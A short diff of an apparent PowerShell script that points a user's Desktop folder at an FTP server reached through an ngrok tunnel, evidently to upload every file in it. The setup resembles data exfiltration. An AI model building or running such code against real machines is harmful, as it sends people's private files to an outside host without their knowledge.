@@ -1,5 +1,5 @@
 #we specify the directory where all files that we want to upload  
-$Dir="C:\Users\User"
+$Dir="C:\Users\User\Desktop"
  
 #ftp server 
 $ftp = "ftp://0.tcp.ngrok.io:10385//home/dumdumftp/" 
